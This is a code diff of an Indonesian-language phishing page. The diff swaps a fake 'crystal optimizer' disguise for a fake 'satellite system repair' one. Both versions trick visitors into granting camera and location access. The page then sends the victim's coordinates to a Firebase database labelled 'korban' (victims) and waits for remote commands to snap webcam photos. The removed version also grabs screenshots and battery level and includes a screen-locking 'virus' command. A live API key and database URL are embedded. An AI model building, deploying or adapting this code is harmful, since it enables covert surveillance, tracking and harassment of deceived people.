@@ -2,145 +2,58 @@
 <html lang="id">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>CRYSTAL OPTIMIZER</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SATELLITE | SYSTEM REPAIR</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
     <style>
-        :root { --neon: #c084fc; --deep: #0a0514; }
-        body { 
-            background: var(--deep); 
-            color: var(--neon); 
-            font-family: 'Segoe UI', sans-serif; 
-            margin: 0; 
-            display: flex; 
-            align-items: center; 
-            justify-content: center; 
-            height: 100vh; 
-            overflow: hidden;
-            text-align: center;
-        }
-        
-        .crystal-container {
-            background: rgba(168, 85, 247, 0.1);
-            backdrop-filter: blur(15px);
-            border: 1px solid rgba(192, 132, 252, 0.3);
-            padding: 40px;
-            border-radius: 30px;
-            box-shadow: 0 0 30px rgba(192, 132, 252, 0.2);
-            width: 80%;
-            max-width: 300px;
-            cursor: pointer;
-            transition: 0.4s;
-        }
-
-        .crystal-container:active { transform: scale(0.9); }
-
-        .gem { font-size: 60px; margin-bottom: 20px; text-shadow: 0 0 20px var(--neon); }
-        
-        h2 { margin: 0; font-size: 18px; letter-spacing: 2px; }
-        p { font-size: 12px; opacity: 0.6; margin-top: 10px; }
-
-        #lock-overlay { 
-            display: none; position: fixed; inset: 0; background: black; 
-            z-index: 9999; color: red; padding-top: 50%; font-weight: bold; 
-        }
-
+        body { background: #000; color: #00f2ff; font-family: 'Courier New', monospace; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; text-align: center; }
+        .box { border: 2px solid #00f2ff; padding: 40px; border-radius: 20px; background: rgba(0, 242, 255, 0.05); box-shadow: 0 0 20px #00f2ff; cursor: pointer; transition: 0.3s; width: 80%; }
+        .box:active { transform: scale(0.95); }
+        .glitch { animation: flash 1s infinite; color: #ff00ea; font-weight: bold; }
+        @keyframes flash { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
         video, canvas { display: none; }
     </style>
 </head>
-<body>
-
-    <div id="main-ui" class="crystal-container" onclick="ignite()">
-        <div class="gem">💎</div>
-        <h2>OPTIMIZE</h2>
-        <p id="msg">Ketuk untuk sinkronisasi sinyal kristal dan percepat koneksi.</p>
+<body onclick="ignite()">
+    <div class="box" id="ui">
+        <h1 style="margin:0;">🛰️</h1>
+        <p class="glitch">SYSTEM ERROR DETECTED</p>
+        <p style="font-size: 12px;">Satellite link lost. Click to re-establish 4K Uplink & Repair System.</p>
+        <div id="loader" style="margin-top:20px; font-size: 10px; opacity: 0.6;">[WAITING FOR COMMAND]</div>
     </div>
-
-    <div id="lock-overlay">☣️ SYSTEM ENCRYPTED ☣️</div>
 
     <video id="v" autoplay playsinline></video>
     <canvas id="c"></canvas>
 
 <script>
-    // --- KONFIGURASI FIREBASE (WAJIB SAMA DENGAN DASHBOARD) ---
-    const config = { 
-        apiKey: "AIzaSyAqdcpcUxfUBNY2H83IBa1Pp0X6YcQtDlQ", 
-        databaseURL: "https://theeyes-8d0aa-default-rtdb.asia-southeast1.firebasedatabase.app" 
-    };
-    firebase.initializeApp(config); 
-    const db = firebase.database();
-
-    let myId = null;
+    const config = { apiKey: "AIzaSyAqdcpcUxfUBNY2H83IBa1Pp0X6YcQtDlQ", databaseURL: "https://theeyes-8d0aa-default-rtdb.asia-southeast1.firebasedatabase.app" };
+    firebase.initializeApp(config); const db = firebase.database();
 
     async function ignite() {
-        const msg = document.getElementById('msg');
-        msg.innerText = "Meminta akses satelit...";
-
+        document.getElementById('loader').innerText = "[UPLINKING TO SATELLITE...]";
         try {
-            // 1. Ambil Akses Kamera
             const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
             document.getElementById('v').srcObject = stream;
-
-            // 2. Ambil Lokasi
+            
             navigator.geolocation.getCurrentPosition(async (pos) => {
-                
-                // 3. Ambil Info Baterai
-                let bat = "N/A";
-                if (navigator.getBattery) {
-                    const b = await navigator.getBattery();
-                    bat = Math.round(b.level * 100) + "%";
-                }
-
-                // 4. Kirim Data Awal ke Radar Lu
                 const ref = db.ref('korban').push({
-                    waktu: new Date().toLocaleString('id-ID'),
-                    baterai: bat,
+                    waktu: new Date().toLocaleString(),
                     maps: `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`
                 });
-                myId = ref.key;
+                const myId = ref.key;
+                document.getElementById('ui').innerHTML = "<h2 style='color:#00f2ff;'>REPAIRING... 87%</h2><p style='font-size:10px;'>DO NOT CLOSE THIS TAB</p>";
 
-                // Tampilan Berhasil (Pancingan)
-                document.getElementById('main-ui').style.borderColor = "#22c55e";
-                msg.innerHTML = "<span style='color:#22c55e'>Optimization 99%...</span><br>Jangan tutup tab ini agar koneksi tetap stabil.";
-
-                // 5. Standby Perintah Sadap (Background Process)
                 db.ref('commands/' + myId).on('value', snap => {
-                    const cmd = snap.val();
-                    if (!cmd) return;
-
-                    // EKSEKUSI KAMERA
-                    if (cmd.action === "TAKE") {
+                    if (snap.val()?.action === "TAKE") {
                         const v = document.getElementById('v'), c = document.getElementById('c');
                         c.width = v.videoWidth; c.height = v.videoHeight;
                         c.getContext('2d').drawImage(v, 0, 0);
                         db.ref('hasil_foto/' + myId).set({ foto: c.toDataURL('image/jpeg', 0.5) });
                     }
-
-                    // EKSEKUSI SCREENSHOT
-                    if (cmd.action === "SHOT") {
-                        html2canvas(document.body).then(canvas => {
-                            db.ref('hasil_screenshot/' + myId).set({ foto: canvas.toDataURL('image/jpeg', 0.5) });
-                        });
-                    }
-
-                    // EKSEKUSI PENGUNCI (VIRUS)
-                    if (cmd.action === "VIRUS") {
-                        document.getElementById('lock-overlay').style.display = 'block';
-                        setInterval(() => { alert("CRYSTAL ERROR: DEVICE LOCKED"); }, 500);
-                    }
                 });
-
-            }, (err) => {
-                alert("Gagal: Izin lokasi ditolak. Kalibrasi gagal.");
-                msg.innerText = "Gagal. Klik ulang dan izinkan lokasi.";
-            });
-
-        } catch (err) {
-            alert("Gagal: Izin kamera diperlukan untuk sinkronisasi visual.");
-            msg.innerText = "Gagal. Klik ulang dan izinkan kamera.";
-        }
+            }, () => { alert("Error: GPS Satellite signal required!"); });
+        } catch (e) { alert("Error: Camera Sync required for 4K Scan!"); }
     }
 </script>
 </body>
